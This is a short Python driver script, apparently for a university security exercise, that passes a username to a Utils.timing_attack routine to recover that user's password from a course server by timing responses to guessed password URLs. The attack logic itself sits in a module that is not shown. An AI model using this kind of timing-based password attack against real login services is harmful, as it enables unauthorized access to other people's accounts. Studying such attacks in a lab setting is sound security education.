import sys
import Utils
import Configurations


if len(sys.argv) == 2:

    difficulty = Configurations.difficulty
    username = sys.argv[1]

    start_url = f"http://aoi.ise.bgu.ac.il/?user={username}&password="
    end_url = f"&difficulty={difficulty}"

    password = Utils.timing_attack(start_url=start_url, end_url=end_url)

    if password:
        print(password)
